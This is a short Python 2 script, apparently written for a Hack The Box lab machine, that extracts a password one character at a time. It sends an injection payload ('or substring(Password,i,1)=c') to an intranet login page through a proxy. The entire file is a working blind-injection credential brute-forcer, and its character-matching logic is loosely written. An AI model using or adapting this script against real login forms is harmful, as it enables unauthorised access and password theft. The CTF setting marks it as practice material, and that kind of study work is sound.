#!/usr/bin/env python

import requests
import string

char = string.printable
url = "http://172.31.179.1/intranet.php"
http_proxy = "http://intranet.unbalanced.htb:3128"
s = requests.Session()

username = raw_input()
def bruteforce(username):
    
    password = ""
    for i in range(1,100):
        for c in char:

            payload = "' or substring(Password," + str(i) + ",1)='" + c + "' or '"
            data = {"Username" : payload, "Password" : payload}

            s.proxies = {"http" : http_proxy}

            r = s.post(url, data = data)
            if username in r.text:
                password += c
                print password
    

bruteforce(username)
